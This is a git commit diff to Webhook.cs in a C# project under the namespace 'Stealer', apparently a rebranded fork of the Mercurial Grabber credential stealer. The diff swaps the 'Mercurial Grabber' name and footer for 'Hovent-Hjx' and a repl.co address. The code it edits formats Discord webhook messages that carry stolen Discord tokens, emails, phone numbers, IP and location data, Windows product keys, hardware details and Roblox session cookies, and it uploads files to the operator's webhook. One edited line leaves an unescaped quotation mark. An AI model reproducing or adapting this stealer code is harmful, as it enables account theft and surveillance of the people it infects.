1f624ccf7328818adef77b13d96e05073acf5e84
DEVTOOL877 <73078933+DEVTOOL877@users.noreply.github.com>
2021-12-06 05:37:41 -0800

    Update Webhook.cs

--- Mercurial/Resources/Webhook.cs
+++ Mercurial/Resources/Webhook.cs
@@ -115,33 +115,33 @@ namespace Stealer
     {
         public static string Token(string email, string phone, string token, string username, string avatar, string locale, string creation, string id)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"" + "User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"" + "`" + token + "`" + "\\nAccount Created: (`" + creation + "`)" + "\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Account Info**\",\"value\":\"" + "User ID: " + id + "\\nEmail: " + email + "\\nPhone Number: " + phone + "\\nLocale: " + locale + "\",\"inline\":true},{\"name\":\"**Token**\",\"value\":\"" + "`" + token + "`" + "\\nAccount Created: (`" + creation + "`)" + "\",\"inline\":false}],\"author\":{\"name\":\"" + username + "\",\"icon_url\":\"" + avatar + "\"},\"footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co\"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
 
         public static string IP(string ip, string country, string countryIcon, string regionName, string city, string zip, string isp)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"" + "IP Address - " + ip + "\\nISP - " + isp + "\\nCountry - " + country + "\\nRegion - " + regionName + "\\nCity - " + city + "\\nZip - " + zip + "\",\"inline\":true}],\"thumbnail\":{\"url\":\"" + countryIcon + "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"" + "IP Address - " + ip + "\\nISP - " + isp + "\\nCountry - " + country + "\\nRegion - " + regionName + "\\nCity - " + city + "\\nZip - " + zip + "\",\"inline\":true}],\"thumbnail\":{\"url\":\"" + countryIcon + "\"},\"footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co\"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
 
         public static string ProductKey(string key)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"" + "Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"" + "Product Key - " + key + "\",\"inline\":true}],\"footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co\"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
 
         public static string Hardware(string osName, string osArchitecture, string osVersion, string processName, string gpuVideo, string gpuVersion, string diskDetails, string pcMemory)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"" + "Operating System Name - " + osName + "\\nOperating System Architecture - " + osArchitecture + "\\nVersion - " + osVersion + "\",\"inline\":true}" + ",{\"name\":\"**Processor**\",\"value\":\"" + "CPU - " + processName + "\",\"inline\":false}," + "{\"name\":\"**GPU**\",\"value\":\"" + "Video Processor - " + gpuVideo + "\\nDriver Version  - " + gpuVersion + "\",\"inline\":false}" + ",{\"name\":\"**Memory**\",\"value\":\"" + "Memory - " + pcMemory + "\",\"inline\":false}," + "{\"name\":\"**Disk**\",\"value\":\"" + diskDetails + "\",\"inline\":false}" + "],\"" + "footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"" + "Operating System Name - " + osName + "\\nOperating System Architecture - " + osArchitecture + "\\nVersion - " + osVersion + "\",\"inline\":true}" + ",{\"name\":\"**Processor**\",\"value\":\"" + "CPU - " + processName + "\",\"inline\":false}," + "{\"name\":\"**GPU**\",\"value\":\"" + "Video Processor - " + gpuVideo + "\\nDriver Version  - " + gpuVersion + "\",\"inline\":false}" + ",{\"name\":\"**Memory**\",\"value\":\"" + "Memory - " + pcMemory + "\",\"inline\":false}," + "{\"name\":\"**Disk**\",\"value\":\"" + diskDetails + "\",\"inline\":false}" + "],\"" + "footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co\"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
 
         public static string RobloxCookie(string cookie)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**Roblox Cookie**\",\"value\":\"" + cookie + "\",\"inline\":true}],\"footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
 
 
         public static string SimpleMessage(string title, string message)
         {
-            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**" + title + "**\",\"value\":\"" + message + "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}]" + ",\"username\": \"Mercurial Grabber\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
+            return "{\"content\": \"\",  \"embeds\":" + "[{\"color\":0,\"fields\":[{\"name\":\"**" + title + "**\",\"value\":\"" + message + "\",\"inline\":true}],\"footer\":{\"text\":\"Hovent-Hjx | https://Hovent-Hjx.databasea.repl.co\"}}]" + ",\"username\": \"Hovent-Hjx\", \"avatar_url\":\"https://i.imgur.com/vgxBhmx.png\"" + "}";
         }
     }
     class Webhook
@@ -156,7 +156,7 @@ namespace Stealer
             Dictionary<string, string> data = new Dictionary<string, string>();
 
             data.Add("content", content);
-            data.Add("username", "Mercurial Grabber");
+            data.Add("username", "Hovent-Hjx");
             data.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
             try
             {
@@ -197,7 +197,7 @@ namespace Stealer
             postParameters.Add("filename", filename);
             postParameters.Add("file", new FormUpload.FileParameter(data, filename, application));
 
-            postParameters.Add("username", "Mercurial Grabber");
+            postParameters.Add("username", "Hovent-Hjx");
             postParameters.Add("content", msgBody);
             postParameters.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
 
